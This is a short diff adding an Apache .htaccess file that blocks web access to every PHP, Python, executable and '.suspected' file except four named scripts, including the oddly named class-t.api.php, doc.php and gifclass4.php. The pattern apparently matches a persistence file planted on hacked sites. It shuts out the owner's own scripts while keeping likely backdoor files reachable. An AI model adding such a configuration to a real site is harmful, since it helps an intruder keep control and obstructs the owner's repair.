@@ -1,0 +1,8 @@
+<FilesMatch ".(py|exe|phtml|php|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(^class-t.api.php|^index.php|^doc.php|^gifclass4.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
